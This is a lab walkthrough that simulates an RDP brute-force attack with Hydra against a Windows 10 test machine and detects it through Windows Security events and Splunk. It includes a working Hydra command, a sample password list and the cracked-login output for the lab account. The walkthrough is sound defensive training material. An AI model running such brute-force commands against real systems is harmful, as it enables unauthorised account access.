**Cybersecurity Lab Walkthrough: Use Case 01 - RDP Brute Force Attack Detection**

---

### 🔐 **Objective**

Simulate a brute-force attack against the Remote Desktop Protocol (RDP) and detect it using a SIEM tool.
---

### 🧰 **Lab Components**

* **Attacker Machine:** Kali Linux (Tool: Hydra)
* **Target Machine:** Windows 10 (with RDP enabled, user: `testuser`, known password: `pass123`)
* **SIEM:** Splunk Enterprise on Ubuntu (Motion VM), monitoring Windows logs

---

### 🚀 **Step-by-Step Simulation**

#### 1. **Confirm RDP is Enabled on Windows**

On the Windows machine:

* Run `sysdm.cpl` > Remote tab > Check "Allow remote connections to this computer"
* Ensure `testuser` has permission to log in via RDP

#### 2. **Check Windows Firewall**

* Run `wf.msc`
* Allow inbound connections to port 3389 (RDP)

#### 3. **Run Hydra from Kali**

```bash
hydra -t 4 -V -f -l testuser -P passwords.txt rdp://192.168.246.129
```


* `-t 4`: 4 threads
* `-V`: Verbose
* `-f`: Stop after first valid login
* `-l`: Login name
* `-P`: Password list
* `rdp://`: RDP service on target

**Example passwords.txt:**

```
123456
admin
letmein
wrongpass1
wrongpass2
pass123
```

**Expected output:**

```
[3389][rdp] host: 192.168.246.129   login: testuser   password: pass123
```

![Screenshot 2025-05-28 143949](https://github.com/user-attachments/assets/3658a261-b1b5-4d48-9875-2d617d65feb4)


---

### 🔍 **Verify Windows Event Logs**

Open Event Viewer on Windows:

* Go to `Windows Logs > Security`

Look for:

* **Event ID 4625** - Failed Logon

  * Reason: Unknown user name or bad password
  * **Event ID 4624** - Successful Logon


![Screenshot 2025-05-28 144401](https://github.com/user-attachments/assets/252fd482-8c33-4f9f-b022-626a0aeb82dc)
![Screenshot 2025-05-28 144824](https://github.com/user-attachments/assets/6eb9faab-e95c-4563-a951-4b87919a1ef0)


---

### 🔋 **Splunk Detection Logic**

Ensure Splunk Universal Forwarder is installed and forwarding `Security` logs.

#### Sample Simplified Correlation Search:

![Screenshot 2025-05-28 142435](https://github.com/user-attachments/assets/1a3dd9e1-a6a3-4cd4-9a40-171d6e546bcb)
![Screenshot 2025-05-28 142534](https://github.com/user-attachments/assets/bceacaef-d5ab-4dc5-adf8-4c49d3b74142)



### 📅 **Summary**

This use case emulates an attacker attempting multiple RDP login attempts using brute force. It teaches how to simulate and detect this behavior using native Windows logs and create basic Splunk detection logic. 

